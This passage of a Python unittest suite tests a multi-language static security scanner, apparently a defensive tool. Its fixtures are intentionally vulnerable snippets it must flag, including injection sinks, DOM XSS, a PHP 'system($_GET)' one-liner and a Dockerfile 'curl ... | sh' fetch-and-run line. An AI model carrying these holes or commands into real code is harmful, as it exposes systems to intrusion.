        self.assertEqual([f for f in r.findings if f.rule_id == "config-hardcoded-secret"], [])

    def test_secret_value_is_redacted_in_report(self):
        r = self._scan_files({"a.php": "<?php echo 1;",
                              ".env": "DB_PASSWORD=sup3rs3cr3tvalue\n"})
        secret = [f for f in r.findings if f.rule_id == "config-hardcoded-secret"]
        self.assertTrue(secret)
        self.assertNotIn("sup3rs3cr3tvalue", secret[0].location.code)
        self.assertNotIn("sup3rs3cr3tvalue", render_json(r))


class TestTransitiveDependencies(unittest.TestCase):
    POM = ("<project><dependencies><dependency>"
           "<groupId>org.springframework.boot</groupId>"
           "<artifactId>spring-boot-starter-web</artifactId>"
           "<version>2.7.0</version></dependency></dependencies></project>")

    def test_pom_alone_misses_transitive(self):
        r = _scan({"pom.xml": self.POM, "A.java": "class A {}"})
        self.assertEqual(r.dependency_issues, [])

    def test_maven_dependency_tree_finds_transitive(self):
        tree = ("[INFO] +- org.springframework.boot:spring-boot-starter-web:jar:2.7.0:compile\n"
                "[INFO] |  \\- org.apache.logging.log4j:log4j-core:jar:2.14.0:compile\n")
        r = _scan({"pom.xml": self.POM, "A.java": "class A {}",
                   "dependency-tree.txt": tree})
        pkgs = {d.package for d in r.dependency_issues}
        self.assertIn("org.apache.logging.log4j:log4j-core", pkgs)

    def test_gradle_lockfile_finds_transitive(self):
        lock = "org.apache.logging.log4j:log4j-core:2.14.0=compileClasspath\n"
        r = _scan({"build.gradle": "dependencies { implementation 'x:y:1.0' }",
                   "A.java": "class A {}", "gradle.lockfile": lock})
        pkgs = {d.package for d in r.dependency_issues}
        self.assertIn("org.apache.logging.log4j:log4j-core", pkgs)


EXPRESS_PKG = json.dumps({"dependencies": {"express": "^4.18.0"}})
REACT_PKG = json.dumps({"dependencies": {"react": "^18.2.0"}})
ANGULAR_PKG = json.dumps({"dependencies": {"@angular/core": "^15.0.0"}})


class TestJsDetection(unittest.TestCase):
    def test_language_detected(self):
        r = _scan({"a.js": "const x = 1;"})
        self.assertEqual(r.language, "javascript")

    def test_frameworks_from_package_json(self):
        for pkg, expected in ((EXPRESS_PKG, "Express"), (REACT_PKG, "React"),
                              (ANGULAR_PKG, "Angular")):
            r = _scan({"package.json": pkg, "a.js": "const x = 1;"})
            self.assertEqual(r.framework, expected)

    def test_framework_from_source_markers(self):
        r = _scan({"a.js": "const express = require('express');\nconst app = express();"})
        self.assertEqual(r.framework, "Express")

    def test_typescript_and_tsx_are_parsed(self):
        r = _scan({"package.json": REACT_PKG,
                   "C.tsx": "export function C(){ const u: string = location.hash;"
                            " return <div dangerouslySetInnerHTML={{__html:u}} />; }"})
        self.assertIn("react-xss-dangerously-set-inner-html",
                      {f.rule_id for f in r.findings})

    def test_minified_and_declaration_files_skipped(self):
        r = _scan({"app.min.js": "eval(location.hash);",
                   "types.d.ts": "declare const x: string;",
                   "a.js": "const ok = 1;"})
        self.assertEqual(r.files_scanned, 1)


class TestJsTaintEngine(unittest.TestCase):
    def _rules(self, code, filename="a.js", pkg=None):
        files = {filename: code}
        if pkg:
            files["package.json"] = pkg
        return {f.rule_id for f in _scan(files).findings}

    def test_raw_dom_xss(self):
        self.assertIn("js-xss-innerhtml",
                      self._rules("el.innerHTML = location.hash;"))
        self.assertIn("js-xss-document-write",
                      self._rules("document.write(location.href);"))

    def test_eval_of_url_data(self):
        self.assertIn("js-code-eval", self._rules("const q=location.search; eval(q);"))

    def test_template_literal_and_aliasing(self):
        self.assertIn("js-xss-innerhtml", self._rules(
            "const u = location.hash; const v = u; el.innerHTML = `<b>${v}</b>`;"))

    def test_url_search_params_propagates(self):
        self.assertIn("js-xss-innerhtml", self._rules(
            "const b = new URLSearchParams(location.search).get('b');"
            " el.innerHTML = b;"))

    def test_express_request_sinks(self):
        cases = {
            "app.get('/x',(req,res)=>{ db.query('SELECT '+req.query.id); });":
                "js-sqli-query",
            "const cp=require('child_process');"
            "app.get('/x',(req,res)=>{ cp.exec('ls '+req.query.d); });":
                "js-cmdi-exec",
            "const fs=require('fs');"
            "app.get('/x',(req,res)=>{ fs.readFile(req.query.p, cb); });":
                "js-path-readfile",
            "app.get('/x',(req,res)=>{ res.redirect(req.query.n); });":
                "js-redirect-res",
            "app.get('/x',(req,res)=>{ fetch(req.query.u); });":
                "js-ssrf-fetch",
        }
        for code, rule_id in cases.items():
            self.assertIn(rule_id, self._rules(code, pkg=EXPRESS_PKG), code)

    def test_destructured_request_data(self):
        self.assertIn("js-sqli-query", self._rules(
            "app.get('/x',(req,res)=>{ const {id} = req.query;"
            " db.query('SELECT '+id); });", pkg=EXPRESS_PKG))

    def test_interprocedural_helper(self):
        self.assertIn("js-cmdi-exec", self._rules(
            "function run(c){ require('child_process').exec(c); }\n"
            "app.get('/x',(req,res)=>{ run(req.query.c); });", pkg=EXPRESS_PKG))

    def test_react_dangerously_set_inner_html(self):
        self.assertIn("react-xss-dangerously-set-inner-html", self._rules(
            "export default function C(){ const u=location.search;"
            " return <div dangerouslySetInnerHTML={{__html:u}} />; }",
            filename="C.jsx", pkg=REACT_PKG))

    def test_react_safe_child_is_not_flagged(self):
        self.assertEqual(self._rules(
            "export function C(){ const u=location.hash; return <div>{u}</div>; }",
            filename="C.jsx", pkg=REACT_PKG), set())

    def test_angular_sanitizer_bypass(self):
        rules = self._rules(
            "@Component({}) export class C { constructor(private s: DomSanitizer){}"
            " f(){ const u = location.hash; this.s.bypassSecurityTrustHtml(u); } }",
            filename="c.ts", pkg=ANGULAR_PKG)
        self.assertIn("angular-xss-bypasssecuritytrusthtml", rules)

    def test_sanitizers_clear_taint(self):
        self.assertEqual(self._rules(
            "el.innerHTML = DOMPurify.sanitize(location.hash);"), set())
        self.assertEqual(self._rules(
            "app.get('/x',(req,res)=>{ db.query('SELECT '+parseInt(req.query.id)); });",
            pkg=EXPRESS_PKG), set())

    def test_second_order_process_env_is_low_confidence(self):
        f = [x for x in _scan({"a.js": "const cp=require('child_process');"
                                       " cp.exec(process.env.CMD);"}).findings
             if x.rule_id == "js-cmdi-exec"]
        self.assertTrue(f)
        self.assertEqual(f[0].confidence, "low")

    def test_pattern_rule_reports_once_per_occurrence(self):
        """A text rule must not fire once per enclosing node."""
        r = _scan({"package.json": ANGULAR_PKG,
                   "c.ts": "import { DomSanitizer } from '@angular/platform-browser';\n"
                           "@Component({}) export class C {\n"
                           "  constructor(private s: DomSanitizer){}\n"
                           "  f(){ return 1; }\n}"})
        hits = [f for f in r.findings if f.rule_id == "angular-xss-bypass-import"]
        self.assertEqual(len(hits), 1)


class TestJsPatternRules(unittest.TestCase):
    def _rules(self, code):
        return {f.rule_id for f in _scan({"a.js": code}).findings}

    def test_patterns_fire(self):
        cases = {
            "const t = Math.random();": "js-weak-random",
            "crypto.createHash('md5');": "js-crypto-weak-hash",
            f"const apiKey = '{FAKE_STRIPE_KEY}';": "secret-stripe-key",
            "const o = { rejectUnauthorized: false };": "js-tls-verify-disabled",
            "jwt.verify(t, k, { algorithms: ['none'] });": "js-jwt-none-algorithm",
        }
        for code, rule_id in cases.items():
            self.assertIn(rule_id, self._rules(code), code)

    def test_secure_equivalents_clean(self):
        for code in ("const t = crypto.randomUUID();",
                     "crypto.createHash('sha256');",
                     "const o = { rejectUnauthorized: true };"):
            self.assertEqual(self._rules(code), set(), code)


class TestNpmDependencies(unittest.TestCase):
    def test_package_json_direct_dependency(self):
        r = _scan({"a.js": "const x=1;",
                   "package.json": json.dumps({"dependencies": {"lodash": "4.17.11"}})})
        self.assertIn("lodash", {d.package for d in r.dependency_issues})

    def test_package_lock_finds_transitive(self):
        lock = json.dumps({
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "app"},
                "node_modules/express": {"version": "4.18.2"},
                "node_modules/minimist": {"version": "1.2.0"},
            },
        })
        r = _scan({"a.js": "const x=1;",
                   "package.json": json.dumps({"dependencies": {"express": "^4.18.0"}}),
                   "package-lock.json": lock})
        # minimist is transitive: it is not in package.json at all.
        self.assertIn("minimist", {d.package for d in r.dependency_issues})

    def test_yarn_lock_parsed(self):
        yarn = 'minimist@^1.2.0:\n  version "1.2.0"\n  resolved "https://x"\n'
        r = _scan({"a.js": "const x=1;",
                   "package.json": json.dumps({"dependencies": {"minimist": "^1.2.0"}}),
                   "yarn.lock": yarn})
        self.assertIn("minimist", {d.package for d in r.dependency_issues})

    def test_non_registry_specs_ignored(self):
        r = _scan({"a.js": "const x=1;",
                   "package.json": json.dumps({"dependencies": {
                       "local": "file:../local", "repo": "github:a/b", "any": "*"}})})
        self.assertEqual(r.dependency_issues, [])


class TestPolyglotWithJavaScript(unittest.TestCase):
    """The JS engine must run alongside the PHP and Java engines."""

    def _build(self, files):
        tmp = tempfile.mkdtemp()
        for rel, content in files.items():
            path = os.path.join(tmp, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as fh:
                fh.write(content)
        return ScanEngine(ScanOptions()).scan(tmp)

    def test_php_backend_with_react_frontend(self):
        r = self._build({
            "backend/composer.json": json.dumps(
                {"require": {"laravel/framework": "^9.0"}}),
            "backend/app/C.php": "<?php $id=$_GET['id'];"
                                 " mysqli_query($c, 'SELECT '.$id);",
            "frontend/package.json": REACT_PKG,
            "frontend/src/P.jsx": "export default function P(){"
                                  " const b = location.search;"
                                  " return <div dangerouslySetInnerHTML={{__html:b}} />; }",
        })
        self.assertEqual(sorted(r.languages), ["javascript", "php"])
        self.assertEqual(r.frameworks.get("php"), "Laravel")
        self.assertEqual(r.frameworks.get("javascript"), "React")
        by_lang = {f.language for f in r.findings}
        self.assertEqual(by_lang, {"php", "javascript"})

    def test_java_backend_with_angular_frontend(self):
        r = self._build({
            "api/pom.xml": "<project><dependencies><dependency>"
                           "<groupId>org.springframework.boot</groupId>"
                           "<artifactId>spring-boot-starter-web</artifactId>"
                           "<version>2.7.0</version></dependency></dependencies></project>",
            "api/src/main/java/A.java":
                "import org.springframework.web.bind.annotation.*;\n"
                "@RestController public class A {\n"
                " @GetMapping(\"/r\") public void r(@RequestParam String q) throws Exception {\n"
                "  Runtime.getRuntime().exec(q); } }",
            "web/package.json": ANGULAR_PKG,
            "web/src/app.component.ts":
                "@Component({}) export class C { f(){"
                " this.sanitizer.bypassSecurityTrustHtml(location.hash); } }",
        })
        self.assertEqual(sorted(r.languages), ["java", "javascript"])
        self.assertEqual(r.frameworks.get("java"), "Spring Boot")
        self.assertEqual(r.frameworks.get("javascript"), "Angular")
        self.assertEqual({f.language for f in r.findings}, {"java", "javascript"})

    def test_node_apis_flagged_regardless_of_detected_framework(self):
        """A React repo still runs Node in API routes and build scripts."""
        r = self._build({
            "package.json": REACT_PKG,
            "src/api.js": "const fs=require('fs');"
                          " export function f(req){ fs.readFile(req.query.p, cb); }",
        })
        self.assertIn("js-path-readfile", {f.rule_id for f in r.findings})

    def test_three_languages_at_once(self):
        r = self._build({
            "api/pom.xml": "<project><dependencies><dependency>"
                           "<groupId>org.springframework.boot</groupId>"
                           "<artifactId>spring-boot-starter-web</artifactId>"
                           "<version>2.7.0</version></dependency></dependencies></project>",
            "api/src/main/java/A.java":
                "import org.springframework.web.bind.annotation.*;\n"
                "@RestController public class A {\n"
                " @GetMapping(\"/r\") public void r(@RequestParam String q) throws Exception {\n"
                "  Runtime.getRuntime().exec(q); } }",
            "legacy/composer.json": json.dumps({"require": {"php": "^8.0"}}),
            "legacy/index.php": "<?php system($_GET['c']);",
            "web/package.json": REACT_PKG,
            "web/src/a.js": "el.innerHTML = location.hash;",
        })
        self.assertEqual(sorted(r.languages), ["java", "javascript", "php"])
        self.assertEqual({f.language for f in r.findings},
                         {"java", "javascript", "php"})


class TestPythonEngine(unittest.TestCase):
    def _rules(self, code, name="a.py"):
        return {f.rule_id for f in _scan({name: code}).findings}

    def test_request_to_dangerous_sinks(self):
        cases = {
            "from flask import request\ndef v():\n    eval(request.args['q'])\n":
                "py-code-eval",
            "import os\nfrom flask import request\n"
            "def v():\n    os.system('ls ' + request.args['d'])\n":
                "py-cmdi-os-system",
            "from flask import request\n"
            "def v(cur):\n    cur.execute('SELECT ' + request.args['id'])\n":
                "py-sqli-execute",
            "import pickle\nfrom flask import request\n"
            "def v():\n    pickle.loads(request.data)\n":
                "py-deser-pickle-loads",
            "from flask import request\ndef v():\n    open(request.args['f'])\n":
                "py-path-open",
        }
        for code, rule_id in cases.items():
            self.assertIn(rule_id, self._rules(code), code)

    def test_int_coercion_sanitizes(self):
        self.assertEqual(self._rules(
            "from flask import request\n"
            "def v(cur):\n    cur.execute('SELECT ' + str(int(request.args['id'])))\n"
        ), set())

    def test_python_pattern_rules(self):
        self.assertIn("py-weak-random", self._rules("import random\nt = random.randint(0,9)\n"))
        self.assertIn("py-assert-auth", self._rules("def v(u):\n    assert u.is_admin\n"))
        self.assertIn("py-django-debug", self._rules("DEBUG = True\n", "settings.py"))

    def test_framework_detection(self):
        r = _scan({"app.py": "from flask import request, Flask\napp = Flask(__name__)\n"})
        self.assertEqual(r.framework, "Flask")


class TestGoEngine(unittest.TestCase):
    def _rules(self, body):
        return {f.rule_id for f in _scan({"go.mod": "module x\n", "a.go": body}).findings}

    def test_request_to_sinks(self):
        base = ('package main\nimport ("net/http"; "os/exec"; "os")\n'
                'func h(w http.ResponseWriter, r *http.Request) {\n  %s\n}\n')
        cases = {
            'exec.Command("sh", "-c", r.FormValue("c"))': "go-cmdi-command",
            'db.Query("SELECT * FROM t WHERE id=" + r.FormValue("id"))': "go-sqli-query",
            'os.Open(r.FormValue("f"))': "go-path-open",
        }
        for stmt, rule_id in cases.items():
            self.assertIn(rule_id, self._rules(base % stmt), stmt)

    def test_local_variable_alias(self):
        """Go's short_var_declaration must bind taint."""
        self.assertIn("go-cmdi-command", self._rules(
            'package main\nimport ("net/http"; "os/exec")\n'
            'func h(w http.ResponseWriter, r *http.Request) {\n'
            '  d := r.FormValue("d")\n  exec.Command("sh", "-c", d)\n}\n'))

    def test_atoi_sanitizes(self):
        self.assertEqual(self._rules(
            'package main\nimport ("net/http"; "strconv")\n'
            'func h(w http.ResponseWriter, r *http.Request) {\n'
            '  id, _ := strconv.Atoi(r.FormValue("id"))\n'
            '  db.Query("SELECT " + id)\n}\n'), set())

    def test_go_patterns_and_framework(self):
        self.assertIn("go-tls-skip-verify", self._rules(
            'package main\nvar c = tls.Config{InsecureSkipVerify: true}\n'))
        r = _scan({"go.mod": "module x\nrequire github.com/gin-gonic/gin v1.7.0\n",
                   "a.go": "package main\n"})
        self.assertEqual(r.framework, "Gin")


class TestCSharpEngine(unittest.TestCase):
    def _rules(self, body):
        return {f.rule_id for f in _scan({"a.cs": body}).findings}

    def test_request_to_sinks(self):
        base = 'class C { void M() { %s } }'
        cases = {
            'var id = Request.Query["id"]; cmd.ExecuteReader("SELECT " + id);':
                "cs-sqli-executereader",
            'var d = Request.Query["d"]; Process.Start("cmd.exe", d);':
                "cs-cmdi-process-start",
            'var f = Request.Query["f"]; File.ReadAllText(f);':
                "cs-path-readalltext",
        }
        for stmt, rule_id in cases.items():
            self.assertIn(rule_id, self._rules(base % stmt), stmt)

    def test_csharp_patterns(self):
        self.assertIn("cs-binaryformatter",
                      self._rules('class C { void M() { var f = new BinaryFormatter(); } }'))
        self.assertIn("cs-weak-random",
                      self._rules('class C { void M() { var r = new Random(); } }'))


class TestCEngine(unittest.TestCase):
    def _rules(self, code, name="a.c"):
        return {f.rule_id for f in _scan({name: code}).findings}

    def test_inherently_unsafe_functions(self):
        """gets()/strcpy() are unsafe regardless of whether input is tainted."""
        self.assertIn("c-unsafe-gets", self._rules(
            '#include <stdio.h>\nint main(){ char b[64]; gets(b); return 0; }\n'))
        self.assertIn("c-unsafe-strcpy", self._rules(
            '#include <string.h>\nint main(){ char d[8]; strcpy(d,"x"); return 0; }\n'))

    def test_argv_is_a_taint_source(self):
        rules = self._rules(
            '#include <stdlib.h>\nint main(int argc, char**argv){'
            ' system(argv[1]); return 0; }\n')
        self.assertIn("c-cmdi-system", rules)

    def test_format_string(self):
        self.assertIn("c-fmt-printf", self._rules(
            '#include <stdio.h>\nint main(int c, char**argv){ printf(argv[1]); return 0; }\n'))

    def test_allocation_off_by_one(self):
        self.assertIn("c-strlen-alloc", self._rules(
            '#include <stdlib.h>\n#include <string.h>\n'
            'char* f(char* s){ return malloc(strlen(s)); }\n'))

    def test_cpp_uses_the_same_rules(self):
        self.assertIn("c-unsafe-strcpy", self._rules(
            '#include <cstring>\nint main(){ char d[8]; strcpy(d,"x"); return 0; }\n',
            name="a.cpp"))


class TestIacScanning(unittest.TestCase):
    def _rules(self, files):
        return {f.rule_id for f in _scan(files).findings}

    def test_terraform(self):
        cases = {
            'resource "aws_security_group" "x" { ingress { cidr_blocks = ["0.0.0.0/0"] } }':
                "iac-tf-sg-world-ingress",
            'resource "aws_s3_bucket" "b" { acl = "public-read" }':
                "iac-tf-s3-public-acl",
            'resource "aws_db_instance" "d" { publicly_accessible = true }':
                "iac-tf-db-public",
            'resource "aws_instance" "i" { metadata_options { http_tokens = "optional" } }':
                "iac-tf-imdsv1",
        }
        for body, rule_id in cases.items():
            self.assertIn(rule_id, self._rules({"m.tf": body}), body)

    def test_kubernetes(self):
        pod = ("apiVersion: v1\nkind: Pod\nspec:\n  hostNetwork: true\n"
               "  containers:\n  - name: x\n    securityContext:\n"
               "      privileged: true\n")
        rules = self._rules({"p.yaml": pod})
        self.assertIn("iac-k8s-privileged", rules)
        self.assertIn("iac-k8s-host-namespace", rules)

    def test_docker_compose(self):
        self.assertIn("iac-compose-docker-socket", self._rules({
            "docker-compose.yml":
                "services:\n  x:\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n"}))

    def test_secure_config_is_silent(self):
        self.assertEqual(self._rules({"m.tf": 'resource "aws_s3_bucket" "b" { acl = "private" }'}),
                         set())

    def test_plain_yaml_is_not_treated_as_kubernetes(self):
        self.assertEqual(self._rules({"data.yaml": "colours:\n  - red\n  - blue\n"}), set())


class TestContainerScanning(unittest.TestCase):
    def _rules(self, dockerfile):
        return {f.rule_id for f in _scan({"Dockerfile": dockerfile}).findings}

    def test_dockerfile_rules(self):
        self.assertIn("container-runs-as-root",
                      self._rules("FROM alpine:3.14\nRUN echo hi\n"))
        self.assertIn("container-curl-pipe-shell",
                      self._rules("FROM alpine:3.14\nRUN curl -sL https://x.sh | sh\nUSER app\n"))
        self.assertIn("container-latest-tag",
                      self._rules("FROM node:latest\nUSER app\n"))

    def test_non_root_user_is_not_flagged(self):
        self.assertNotIn("container-runs-as-root",
                         self._rules("FROM alpine:3.14\nUSER app\n"))

    def test_secret_in_env_is_redacted(self):
        r = _scan({"Dockerfile": "FROM alpine:3.14\n"
                                 "ENV API_KEY=A1b2C3d4E5f6G7h8\nUSER app\n"})
        hits = [f for f in r.findings if f.rule_id == "container-secret-in-env"]
        self.assertTrue(hits)
        self.assertNotIn("A1b2C3d4E5f6G7h8", hits[0].location.code)

    def test_base_image_matched_against_advisories(self):
        """A base image is treated as a dependency."""
        from sast.analysis.containers import base_images
        import tempfile as _t
        d = _t.mkdtemp()
        path = os.path.join(d, "Dockerfile")
        with open(path, "w") as fh:
            fh.write("FROM alpine:3.14\nUSER app\n")
        found = base_images([path])
        self.assertEqual(found[0][1], "alpine")
        self.assertEqual(found[0][2], "3.14")


class TestSecretsScanning(unittest.TestCase):
    def _rules(self, files):
        return {f.rule_id for f in _scan(files).findings}

    def test_provider_patterns(self):
        cases = {
            f"aws_key = {FAKE_AWS_KEY}": "secret-aws-access-key-id",
            f"token: {FAKE_GITHUB_TOKEN}": "secret-github-token",
            FAKE_PEM_HEADER: "secret-private-key",
            f'TOKEN = "{FAKE_SLACK_TOKEN}"': "secret-slack-token",
            'DB = "postgres://admin:s3cr3tP4ss@db.internal:5432/app"':
                "secret-db-connection-uri",
        }
        for content, rule_id in cases.items():
            self.assertIn(rule_id, self._rules({"cfg.txt": content}), content)

    def test_high_entropy_assignment(self):
        self.assertIn("secret-high-entropy-assignment",
                      self._rules({"a.py": 'api_key = "8Fq2Zx9vLm4KpR7tWn3Yb6Hd1Jc5Gs0A"'}))

    def test_placeholders_and_low_entropy_ignored(self):
        for content in ('password = "changeme"',
                        'api_key = "your-api-key-here"',
                        'password = "aaaaaaaaaaaa"',
                        'token = "${env.TOKEN}"',
                        'secret = "xxxxxxxxxxxx"'):
            self.assertEqual(self._rules({"a.py": content}), set(), content)

    def test_secret_value_never_reaches_the_report(self):
        secret = FAKE_AWS_KEY
        r = _scan({"cfg.txt": f"aws_key = {secret}"})
        self.assertTrue(r.findings)
        self.assertNotIn(secret, r.findings[0].location.code)
        self.assertNotIn(secret, render_json(r))

    def test_example_files_downgraded(self):
        real = _scan({"cfg.txt": f"aws_key = {FAKE_AWS_KEY}"}).findings
        example = _scan({"example.txt": f"aws_key = {FAKE_AWS_KEY}"}).findings
        self.assertTrue(real and example)
        self.assertEqual(real[0].severity, Severity.CRITICAL)
        self.assertEqual(example[0].severity, Severity.MEDIUM)

    def test_entropy_helper(self):
        from sast.analysis.secrets import redact, shannon_entropy
        self.assertGreater(shannon_entropy("8Fq2Zx9vLm4KpR7tWn3Yb6"), 3.6)
        self.assertLess(shannon_entropy("aaaaaaaaaaaaaaaa"), 1.0)
        self.assertNotIn("SECRET", redact("MYSUPERSECRETVALUE"))


class TestCrossCuttingScanners(unittest.TestCase):
    def test_repo_with_no_source_language_is_still_scanned(self):
        """A Terraform- or Dockerfile-only repo must not be skipped."""
        r = _scan({"main.tf": 'resource "aws_s3_bucket" "b" { acl = "public-read" }'})
        self.assertEqual(r.languages, [])
        self.assertIn("iac-tf-s3-public-acl", {f.rule_id for f in r.findings})

    def test_scanners_can_be_disabled(self):
        files = {"a.py": "x = 1\n",
                 "main.tf": 'resource "aws_s3_bucket" "b" { acl = "public-read" }',
                 "cfg.txt": f"aws_key = {FAKE_AWS_KEY}"}
        tmp = tempfile.mkdtemp()
        for rel, content in files.items():
            with open(os.path.join(tmp, rel), "w") as fh:
                fh.write(content)
        full = ScanEngine(ScanOptions()).scan(tmp)
        self.assertTrue({f.language for f in full.findings} >= {"iac", "secrets"})

        no_iac = ScanEngine(ScanOptions(scan_iac=False)).scan(tmp)
        self.assertNotIn("iac", {f.language for f in no_iac.findings})

        only_secrets = ScanEngine(ScanOptions(
            scan_code=False, scan_iac=False, scan_containers=False,
            scan_templates=False, scan_configs=False)).scan(tmp)
        self.assertEqual({f.language for f in only_secrets.findings}, {"secrets"})

    def test_eight_languages_in_one_scan(self):
        r = _scan({
            "legacy/index.php": '<?php system($_GET["c"]);',
            "api/src/main/java/A.java":
                "import org.springframework.web.bind.annotation.*;\n"
                "@RestController public class A {\n"
                " @GetMapping(\"/r\") public void r(@RequestParam String q) throws Exception {\n"
                "  Runtime.getRuntime().exec(q); } }",
            "web/app.js": "el.innerHTML = location.hash;",
            "svc/app.py": "import os\nfrom flask import request\n"
                          "def h():\n    os.system(request.args['d'])\n",
            "api-go/main.go": 'package main\nimport ("net/http";"os/exec")\n'
                              'func h(w http.ResponseWriter, r *http.Request) {'
                              ' exec.Command("sh","-c",r.FormValue("c")) }\n',
            "dotnet/App.cs": 'class C { void M() { var f = Request.Query["f"];'
                             ' File.ReadAllText(f); } }',
            "native/main.c": '#include <stdio.h>\nint main(){ char b[8]; gets(b); return 0; }\n',
        })
        langs = {f.language for f in r.findings}
        for expected in ("php", "java", "javascript", "python", "go", "csharp", "c"):
            self.assertIn(expected, langs, f"{expected} engine produced no finding")


class TestNewEcosystemDependencies(unittest.TestCase):
    def test_python_requirements(self):
        r = _scan({"a.py": "x = 1\n", "requirements.txt": "flask==2.0.1\njinja2==2.10\n"})
        self.assertIsInstance(r.dependency_issues, list)

    def test_go_sum_parsed(self):
        from sast.advisory.misc_ecosystems import parse_go_dependencies
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "go.sum"), "w") as fh:
            fh.write("github.com/gin-gonic/gin v1.7.0 h1:abc=\n"
                     "golang.org/x/text v0.3.3/go.mod h1:def=\n")
        deps = dict(parse_go_dependencies(tmp))
        self.assertEqual(deps.get("github.com/gin-gonic/gin"), "1.7.0")

    def test_csproj_parsed(self):
        from sast.advisory.misc_ecosystems import parse_dotnet_dependencies
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "App.csproj"), "w") as fh:
            fh.write('<Project><ItemGroup>'
                     '<PackageReference Include="Newtonsoft.Json" Version="12.0.1" />'
                     '</ItemGroup></Project>')
        self.assertEqual(dict(parse_dotnet_dependencies(tmp)).get("Newtonsoft.Json"),
                         "12.0.1")

    def test_conan_parsed(self):
        from sast.advisory.misc_ecosystems import parse_native_dependencies
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "conanfile.txt"), "w") as fh:
            fh.write("[requires]\nopenssl/1.1.1k\nzlib/1.2.11\n")
        deps = dict(parse_native_dependencies(tmp))
        self.assertEqual(deps.get("openssl"), "1.1.1k")


class TestReachability(unittest.TestCase):
    """A vulnerable package nothing imports is not the same risk as one it calls."""

    NPM_PKG = json.dumps({"dependencies": {
        "lodash": "4.17.11", "minimist": "1.2.0", "express": "4.17.1"}})

    def _by_package(self, result):
        out = {}
        for d in result.dependency_issues:
            out.setdefault(d.package, []).append(d)
        return out

    def test_called_imported_and_unused(self):
        r = _scan({
            "package.json": self.NPM_PKG,
            "app.js": "const _ = require('lodash');\n"
                      "const express = require('express');\n"
                      "function m(a, b) { return _.defaultsDeep(a, b); }\n",
        })
        by_pkg = self._by_package(r)
        states = {d.reachability for d in by_pkg["lodash"]}
        self.assertIn("called", states)      # defaultsDeep is named and called
        self.assertEqual(by_pkg["express"][0].reachability, "imported")
        self.assertEqual(by_pkg["minimist"][0].reachability, "unused")

    def test_reachable_issues_rank_first(self):
        """A called medium outranks an unimported critical."""
        r = _scan({
            "package.json": self.NPM_PKG,
            "app.js": "const express = require('express');\n",
        })
        order = [d.reachability for d in r.dependency_issues]
        self.assertEqual(order[0], "imported")
        self.assertEqual(order[-1], "unused")
        # minimist is critical but unimported, so it must not be first.
        self.assertNotEqual(r.dependency_issues[0].package, "minimist")

    def test_python_import_alias(self):
        """PyPI names and import names differ: pyyaml imports as yaml."""
        r = _scan({"requirements.txt": "pyyaml==5.3\nrequests==2.25.0\n",
                   "app.py": "import yaml\ndef f(s): return yaml.safe_load(s)\n"})
        by_pkg = self._by_package(r)
        self.assertEqual(by_pkg["pyyaml"][0].reachability, "imported")
        self.assertEqual(by_pkg["requests"][0].reachability, "unused")

    def test_submodule_import_counts(self):
        r = _scan({"requirements.txt": "jinja2==2.10\n",
                   "app.py": "from jinja2.sandbox import SandboxedEnvironment\n"})
        self.assertEqual(r.dependency_issues[0].reachability, "imported")

    def test_evidence_is_recorded(self):
        r = _scan({"package.json": self.NPM_PKG,
                   "app.js": "const _ = require('lodash');\n"})
        for d in r.dependency_issues:
            self.assertTrue(d.reachability_note, d.package)

    def test_can_be_disabled(self):
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "package.json"), "w") as fh:
            fh.write(self.NPM_PKG)
        with open(os.path.join(tmp, "app.js"), "w") as fh:
            fh.write("const _ = require('lodash');\n")
        off = ScanEngine(ScanOptions(reachability=False)).scan(tmp)
        self.assertTrue(off.dependency_issues)
        self.assertEqual({d.reachability for d in off.dependency_issues}, {""})

    def test_base_images_are_exempt(self):
        """A base image is not imported by source; the question does not apply."""
        from sast.analysis.reachability import ImportIndex, annotate
        from sast.models import DependencyIssue, Severity
        issue = DependencyIssue(package="alpine (base image)", version="3.14",
                                cve="CVE-X", severity=Severity.HIGH, title="t",
                                description="d", fixed_in="3.15")
        annotate([issue], ImportIndex())
        self.assertEqual(issue.reachability, "")

    def test_reachability_in_json_report(self):
        r = _scan({"package.json": self.NPM_PKG,
                   "app.js": "const _ = require('lodash');\n"})
        data = json.loads(render_json(r))
        self.assertIn("reachability", data["dependency_issues"][0])

    def test_advisory_prose_does_not_create_false_calls(self):
        """Ordinary words in an advisory must not count as called symbols."""
        from sast.analysis.reachability import affected_symbols
        symbols = affected_symbols(
            "This allows a remote attacker to cause denial of service "
            "through the request handling function in the server module.")
        self.assertEqual(symbols, set())

    def test_symbol_extraction_forms(self):
        from sast.analysis.reachability import affected_symbols
        self.assertIn("defaultsDeep", affected_symbols("pollution via defaultsDeep"))
        self.assertIn("safe_load", affected_symbols("use yaml.safe_load() instead"))
        self.assertIn("load", affected_symbols("yaml.load is unsafe"))

    def test_go_module_path_matching(self):
        from sast.analysis.reachability import ImportIndex, assess
        index = ImportIndex(modules={"github.com/gin-gonic/gin"}, calls=set())
        state, _note = assess("github.com/gin-gonic/gin", "go", index)
        self.assertEqual(state, "imported")

    def test_java_group_artifact_matching(self):
        from sast.analysis.reachability import ImportIndex, assess
        index = ImportIndex(
            modules={"org.apache.logging.log4j.LogManager"}, calls=set())
        state, _note = assess("org.apache.logging.log4j:log4j-core", "java", index)
        self.assertEqual(state, "imported")


class TestWebStore(unittest.TestCase):
    def _store(self):
        from sast.web.store import ScanStore
        return ScanStore(tempfile.mkdtemp(prefix="sast-store-"))

    def test_history_survives_restart(self):
        from sast.web.store import ScanStore
        data_dir = tempfile.mkdtemp(prefix="sast-store-")
        first = ScanStore(data_dir)
        record = first.create("path", "/srv/app")
        first.write_report(record.id, "<html>report</html>", '{"findings": []}')
        first.close()

        second = ScanStore(data_dir)
        self.assertEqual(len(second.list()), 1)
        self.assertEqual(second.read_report(record.id), "<html>report</html>")
        second.close()

    def test_restart_marks_running_scans_interrupted(self):
        """A crash must not leave a row reading 'running' forever."""
        from sast.web.store import INTERRUPTED, ScanStore
        data_dir = tempfile.mkdtemp(prefix="sast-store-")
        first = ScanStore(data_dir)
        record = first.create("path", "/srv/app")   # left running
        first.close()

        second = ScanStore(data_dir)
